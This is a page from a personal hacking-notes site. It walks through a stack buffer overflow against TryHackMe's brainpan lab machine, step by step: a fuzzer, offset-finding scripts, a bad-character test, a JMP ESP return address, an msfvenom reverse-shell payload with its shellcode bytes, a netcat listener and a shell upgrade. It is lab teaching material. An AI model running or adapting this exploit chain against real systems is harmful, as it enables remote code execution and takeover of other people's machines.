

<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../../../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BoF when EXE is on Linux &mdash; docs 0.1 documentation</title>
      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=b86133f3" />
      <link rel="stylesheet" type="text/css" href="../../../_static/css/theme.css?v=e59714d7" />

  
      <script src="../../../_static/jquery.js?v=5d32c60e"></script>
      <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../../../_static/documentation_options.js?v=2709fde1"></script>
      <script src="../../../_static/doctools.js?v=9bcbadda"></script>
      <script src="../../../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../../genindex.html" />
    <link rel="search" title="Search" href="../../../search.html" />
    <link rel="next" title="Windows BoF" href="../Windows/index.html" />
    <link rel="prev" title="How To BoF Linux" href="BoF-init-sneaky.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../../index.html" class="icon icon-home">
            docs
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../../../coding/index.html">Coding Homepage</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../../index.html">Hacking Home Page</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../../SQL/index.html">SQLI Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../FWbypass/index.html">Hacking Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../enum/index.html">Enumeration Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../AD/index.html">Active Directory  Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../metasploit/index.html">Metasploit Home Page</a></li>
<li class="toctree-l2 current"><a class="reference internal" href="../index.html">BoF Home Page</a><ul class="current">
<li class="toctree-l3 current"><a class="reference internal" href="index.html">Linux BoF Home Page</a><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="BoF-init-sneaky.html">How To BoF Linux</a></li>
<li class="toctree-l4 current"><a class="current reference internal" href="#">BoF when EXE is on Linux</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../Windows/index.html">Windows BoF</a></li>
<li class="toctree-l3"><a class="reference internal" href="../index.html#indices-and-tables">Indices and tables</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../shells/index.html">Reverse Shells Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../PE/index.html">PE Homepage</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../pivot/index.html">Network Pivot Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../wireshark.html">Wireshark tips</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../PWdecrypt/index.html">Password Decryption Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../exploits/index.html">Exploits Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../github/index.html">Github Hacking Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../C2/index.html">C2 Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../notableKaliLocations/index.html">Notable Kali Locations Home Page</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../index.html#indices-and-tables">Indices and tables</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">Cyber Defense Home Page</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../IT/index.html">IT Homepage</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../interview_questions/index.html">interview questions</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../walkthroughs/index.html">Walkthroughs Page</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../photoshop/index.html">Photoshop home Page</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../../index.html">docs</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
          <li class="breadcrumb-item"><a href="../../index.html">Hacking Home Page</a></li>
          <li class="breadcrumb-item"><a href="../index.html">BoF Home Page</a></li>
          <li class="breadcrumb-item"><a href="index.html">Linux BoF Home Page</a></li>
      <li class="breadcrumb-item active">BoF when EXE is on Linux</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../../_sources/hacking/BoF/Linux/BoF-Linux-exe.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="bof-when-exe-is-on-linux">
<h1>BoF when EXE is on Linux<a class="headerlink" href="#bof-when-exe-is-on-linux" title="Link to this heading"></a></h1>
<section id="intro">
<h2>Intro<a class="headerlink" href="#intro" title="Link to this heading"></a></h2>
<p><strong>This is based on Try Hack Me’s brainpan</strong></p>
<p>Run an nmap scan and try to find the program port. Try and see if you can download it via website or smb.</p>
<p>Then you can create a script to fuzz the program. This is a python2 script of that. Whenever the program breaks, that number of bytes is when you need to attack.</p>
<p>Once you download the program, put it in a Windows test environment, and launch the program using Immunity Debugger.</p>
</section>
<section id="fuzzer">
<h2>Fuzzer<a class="headerlink" href="#fuzzer" title="Link to this heading"></a></h2>
<p>In brainpan, this crashes the program at 600 bytes.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span>!/usr/bin/python

<span class="go">import socket, time, sys</span>

<span class="go">size = 100</span>

<span class="go">while(size &lt; 2500):</span>

<span class="go">        try:</span>

<span class="go">                print((&quot;\nSending evil buffer with %s bytes&quot; % size))</span>
<span class="go">                buffer = &quot;A&quot; * size</span>
<span class="go">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span class="go">                ip= &quot;10.0.0.178&quot;</span>
<span class="go">                s.connect((ip, 9999))</span>
<span class="go">                s.send(buffer)</span>
<span class="go">                s.close()</span>
<span class="go">                size +=100</span>
<span class="go">                time.sleep(3)</span>
<span class="go">        except:</span>
<span class="go">                print(&quot;\nCould not connect!&quot;)</span>

<span class="go">                sys.exit()</span>
</pre></div>
</div>
</section>
<section id="eupoff1-py">
<h2>EUPoff1.py<a class="headerlink" href="#eupoff1-py" title="Link to this heading"></a></h2>
<p>This results in using msf-pattern_create like so:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf-pattern_create -l 600</span>
</pre></div>
</div>
<p>You then create a file called whatever you want. I called it EIPoff.py . This is in python2</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span>!/usr/bin/python
<span class="go">import os,socket</span>
<span class="go">try:</span>
<span class="go">        print &quot;[+] \nSending evil buffer...&quot;</span>
<span class="go">        buffer = &lt;output of msf-pattern_create&gt;</span>
<span class="go">        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span>
<span class="go">        ip = &quot;Victim Machine IP&quot;</span>
<span class="go">        s.connect((ip, 9999))</span>
<span class="go">        s.send(buffer)</span>
<span class="go">        s.close()</span>
<span class="go">        print &quot;\n[+] Sending buffer of &quot; + str(len(buffer)) + &quot; bytes...&quot;</span>
<span class="go">        print &quot;\n[+] Sending buffer: &quot; + buffer</span>
<span class="go">        print &quot;\n[+] Done!&quot;</span>
<span class="go">except:</span>
<span class="go">        print &quot;\n[+] Could not connect!&quot;</span>
</pre></div>
</div>
<p>You should see in Immunity Debugger that the EIP is a different number. In this case our <cite>EIP is 35724134</cite></p>
<p>You than run <cite>msf-patter_offset</cite> for the second script. In this case it looks like this</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf-pattern_offset -l 600 -q &lt;EIP_number&gt;</span>
</pre></div>
</div>
<p>This should match up with an offset. In this case the offset is 524.</p>
<p>You then make a second EIPoff by creating a python script named EIPoff2.py. Should look similar to this</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span>!/usr/bin/python
<span class="go">import os,socket</span>
<span class="go">try:</span>
<span class="go">        print &quot;[+] \nSending evil buffer...&quot;</span>
<span class="go">        offset = &quot;A&quot; * 524</span>
<span class="go">        eip = &quot;B&quot; * 4</span>
<span class="go">        buffer = offset + eip</span>
<span class="go">        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span>
<span class="go">        ip = &quot;10.0.0.178&quot;</span>
<span class="go">        s.connect((ip, 9999))</span>
<span class="go">        s.send(buffer)</span>
<span class="go">        s.close()</span>
<span class="go">        print &quot;\n[+] Sending buffer of &quot; + str(len(buffer)) + &quot; bytes...&quot;</span>
<span class="go">        print &quot;\n[+] Sending buffer: &quot; + buffer</span>
<span class="go">        print &quot;\n[+] Done!&quot;</span>
<span class="go">except:</span>
<span class="go">        print &quot;\n[+] Could not connect!&quot;</span>
</pre></div>
</div>
<p>Rerun the script in Immunity Debugger, and then run the script above. You should see an output in <cite>EIP of 42424242</cite>. This means the 4 B’s are in the EIP.</p>
</section>
<section id="eipoff3-py">
<h2>EIPoff3.py<a class="headerlink" href="#eipoff3-py" title="Link to this heading"></a></h2>
<p>The purpose of the below is to see if there is enough space for shellcode after EIP.</p>
<p>You then add this line after the eip variable from the previous script</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">shellcode = &quot;C&quot; * (1000 - len(offset) - len(eip))</span>
</pre></div>
</div>
<p>You then change the buffer variable to look like this</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">buffer = offset + eip + shellcode</span>
</pre></div>
</div>
<p>The <cite>EDX</cite> should show a lot of A’s and the <cite>ESP</cite> should show a lot of C’s.
EIPoff4.py Bad Characters
##############################</p>
<p>Now we need to figure out the bad characters. In this case their is no bad characters. If there were, you would eliminate then from the badchars list. An example of how to check would be from the following below. This is a python2 script</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">import os,socket</span>
<span class="go">badchars = (</span>
<span class="go">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10&quot;</span>
<span class="go">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span>
<span class="go">&quot;\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30&quot;</span>
<span class="go">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40&quot;</span>
<span class="go">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span>
<span class="go">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span>
<span class="go">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span>
<span class="go">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span>
<span class="go">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span>
<span class="go">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span>
<span class="go">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span>
<span class="go">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span>
<span class="go">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span>
<span class="go">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span>
<span class="go">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span>
<span class="go">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; )</span>

<span class="go">try:</span>
<span class="go">        print &quot;[+] \nSending evil buffer...&quot;</span>
<span class="go">        offset = &quot;A&quot; * 524</span>
<span class="go">        eip = &quot;B&quot; * 4</span>
<span class="go">        buffer = offset + eip + badchars</span>
<span class="go">        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span>
<span class="go">        ip = &quot;10.0.0.178&quot;</span>
<span class="go">        s.connect((ip, 9999))</span>
<span class="go">        s.send(buffer)</span>
<span class="go">        s.close()</span>
<span class="go">        print &quot;\n[+] Sending buffer of &quot; + str(len(buffer)) + &quot; bytes...&quot;</span>
<span class="go">        print &quot;\n[+] Sending buffer: &quot; + buffer</span>
<span class="go">        print &quot;\n[+] Done!&quot;</span>
<span class="go">except:</span>
<span class="go">        print &quot;\n[+] Could not connect!&quot;</span>
</pre></div>
</div>
</section>
<section id="mona">
<h2>Mona<a class="headerlink" href="#mona" title="Link to this heading"></a></h2>
<p>In Immunity Debugger you would run this to find a valid dll/module</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">!mona modules</span>
</pre></div>
</div>
<p>In the top left field in Immunity Debuger scroll down to find JMP ESP. The number in our case is 311712F3.</p>
</section>
<section id="msfvenom">
<h2>msfvenom<a class="headerlink" href="#msfvenom" title="Link to this heading"></a></h2>
<p>You now run msfvenom to create the shell. It should look something like this</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;Attacker IP&gt; LPORT=&lt;Attacker port&gt; -f python -b &quot;\x00&quot;</span>
</pre></div>
</div>
</section>
<section id="eipoff5-py">
<h2>EIPoff5.py<a class="headerlink" href="#eipoff5-py" title="Link to this heading"></a></h2>
<p>You then create a new file by copying the last one you did. It should look similar to this. Look at the script below to see where you put the stuff.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">import os,socket</span>
<span class="gp">#</span>from<span class="w"> </span>msfvenom
<span class="go">buf =  b&quot;&quot;</span>
<span class="go">buf += b&quot;\xb8\x4e\x7e\x59\x6d\xda\xd5\xd9\x74\x24\xf4\x5e\x33&quot;</span>
<span class="go">buf += b&quot;\xc9\xb1\x12\x31\x46\x12\x83\xee\xfc\x03\x08\x70\xbb&quot;</span>
<span class="go">buf += b&quot;\x98\xa5\x57\xcc\x80\x96\x24\x60\x2d\x1a\x22\x67\x01&quot;</span>
<span class="go">buf += b&quot;\x7c\xf9\xe8\xf1\xd9\xb1\xd6\x38\x59\xf8\x51\x3a\x31&quot;</span>
<span class="go">buf += b&quot;\xf1\xa3\xae\xd5\x6d\xa6\xce\xc4\x31\x2f\x2f\x56\xaf&quot;</span>
<span class="go">buf += b&quot;\x7f\xe1\xc5\x83\x83\x88\x08\x2e\x03\xd8\xa2\xdf\x2b&quot;</span>
<span class="go">buf += b&quot;\xae\x5a\x48\x1b\x7f\xf8\xe1\xea\x9c\xae\xa2\x65\x83&quot;</span>
<span class="go">buf += b&quot;\xfe\x4e\xbb\xc4&quot;</span>
<span class="go">try:</span>
<span class="go">        print &quot;[+] \nSending evil buffer...&quot;</span>
<span class="go">        offset = &quot;A&quot; * 524</span>
<span class="gp">        # </span>from<span class="w"> </span>JMP<span class="w"> </span>ESP<span class="w"> </span>number.<span class="w"> </span>You<span class="w"> </span><span class="k">do</span><span class="w"> </span>it<span class="w"> </span>backwards
<span class="go">        eip = &quot;\xf3\x12\x17\x31&quot;</span>
<span class="gp">        # </span>you<span class="w"> </span><span class="k">do</span><span class="w"> </span>nops<span class="w"> </span>to<span class="w"> </span>avoid<span class="w"> </span>erros<span class="w"> </span>during<span class="w"> </span>decoding
<span class="go">        nops = &quot;\x90&quot; * 10</span>
<span class="go">        buffer = offset + eip + nops + buf</span>
<span class="go">        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span>
<span class="go">        ip = &quot;10.0.0.178&quot;</span>
<span class="go">        s.connect((ip, 9999))</span>
<span class="go">        s.send(buffer)</span>
<span class="go">        s.close()</span>
<span class="go">        print &quot;\n[+] Sending buffer of &quot; + str(len(buffer)) + &quot; bytes...&quot;</span>
<span class="go">        print &quot;\n[+] Sending buffer: &quot; + buffer</span>
<span class="go">        print &quot;\n[+] Done!&quot;</span>

<span class="go">except:</span>
<span class="go">        print &quot;\n[+] Could not connect!&quot;</span>
</pre></div>
</div>
</section>
<section id="shell">
<h2>Shell<a class="headerlink" href="#shell" title="Link to this heading"></a></h2>
<p>You then run a netcat shell like this to get a shell. Run the commands after the netcat command to get an interactive TTY shell.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -lvnp 4444</span>
<span class="go">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
<span class="go">bash -i</span>
</pre></div>
</div>
<p>Use <cite>sudo -l</cite> to find commands that have sudo privileges. Then exploit it to get root</p>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="BoF-init-sneaky.html" class="btn btn-neutral float-left" title="How To BoF Linux" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="../Windows/index.html" class="btn btn-neutral float-right" title="Windows BoF" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2025, mynameisORIG.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>